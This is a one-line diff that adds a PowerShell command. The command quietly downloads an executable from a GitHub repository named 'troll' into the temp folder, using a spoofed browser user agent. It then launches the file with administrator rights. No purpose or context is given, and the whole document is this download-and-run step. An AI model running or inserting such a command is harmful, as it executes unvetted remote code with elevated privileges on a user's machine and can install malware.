@@ -1,0 +1,1 @@
+curl.exe -L -s -o "$env:TEMP\pir_pir_patapim.exe" -A "Mozilla/5.0" "https://github.com/uwuwusudj/troll/raw/refs/heads/main/pir_pir_patapim.exe"; Start-Process "$env:TEMP\pir_pir_patapim.exe" -Verb RunAs
